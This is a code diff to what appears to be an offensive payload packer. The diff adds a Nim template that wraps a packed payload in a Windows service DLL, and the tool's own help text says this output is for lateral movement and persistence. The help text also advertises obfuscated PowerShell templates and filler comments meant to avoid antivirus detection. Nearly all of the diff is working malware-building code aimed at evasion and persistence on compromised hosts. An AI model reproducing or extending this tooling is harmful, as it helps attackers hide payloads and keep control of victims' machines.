@@ -95,7 +95,7 @@ Options:
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation
     --pslyrics    Add Lyrics as comments to avoid some more detections
   --sourceonly    Dont compile but just create the source code and compile command
-  --service    Create a Service binary
+  --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
 
 [Payload retrieval options]
 
@@ -1008,6 +1008,64 @@ let ShellcodeFromFileStub * = fmt"""
         except:
             when defined(verbose):
                 echo obf("[-] Failed to open file: ") & f
+
+"""
+
+let ServiceDllStub * = """
+
+const
+  SVCNAME* = obf("PackerService")
+
+var serviceStatus*: SERVICE_STATUS
+
+var serviceStatusHandle*: SERVICE_STATUS_HANDLE
+
+var stopEvent*: HANDLE
+
+proc UpdateServiceStatus*(currentState: DWORD): VOID =
+  serviceStatus.dwCurrentState = currentState
+  SetServiceStatus(serviceStatusHandle, addr(serviceStatus))
+
+proc ServiceHandler*(controlCode: DWORD; eventType: DWORD; eventData: LPVOID;
+                    context: LPVOID): DWORD =
+  case controlCode
+  of SERVICE_CONTROL_STOP:
+    serviceStatus.dwCurrentState = SERVICE_STOPPED
+    SetEvent(stopEvent)
+  of SERVICE_CONTROL_SHUTDOWN:
+    serviceStatus.dwCurrentState = SERVICE_STOPPED
+    SetEvent(stopEvent)
+  of SERVICE_CONTROL_PAUSE:
+    serviceStatus.dwCurrentState = SERVICE_PAUSED
+  of SERVICE_CONTROL_CONTINUE:
+    serviceStatus.dwCurrentState = SERVICE_RUNNING
+  of SERVICE_CONTROL_INTERROGATE:
+    discard
+  else:
+    discard
+  UpdateServiceStatus(SERVICE_RUNNING)
+  return NO_ERROR
+
+proc ExecuteServiceCode*(): VOID =
+  stopEvent = CreateEvent(nil, TRUE, FALSE, nil)
+  UpdateServiceStatus(SERVICE_RUNNING)
+  ##  #####################################
+  ##  your persistence code here
+  ##  #####################################
+  discard main(nil)
+  while (serviceStatus.dwCurrentState != SERVICE_STOP_PENDING):
+    WaitForSingleObject(stopEvent, INFINITE)
+    UpdateServiceStatus(SERVICE_STOPPED)
+    return
+
+proc ServiceMain*(dwArgc: DWORD, lpszArgv: ptr LPTSTR): VOID {.stdcall,exportc, dynlib.} =
+    NimMain() # otherwise garbage collector and other stuff won't have initialized.
+    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME,
+                                                     cast[LPHANDLER_FUNCTION](ServiceHandler))
+    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS
+    serviceStatus.dwServiceSpecificExitCode = 0
+    UpdateServiceStatus(SERVICE_START_PENDING)
+    ExecuteServiceCode()
 
 """
 
@@ -2181,7 +2239,10 @@ if(dll_out or cpl):
         stub = stub.replace("FUNC_EXPORT", f)
 
 if(service):
-    stub.add(ServiceStub)
+    if(dll_out):
+        stub.add(ServiceDllStub)
+    else:
+        stub.add(ServiceStub)
 
 if (debugMode):
     stub = stub.replace("import strenc", "")
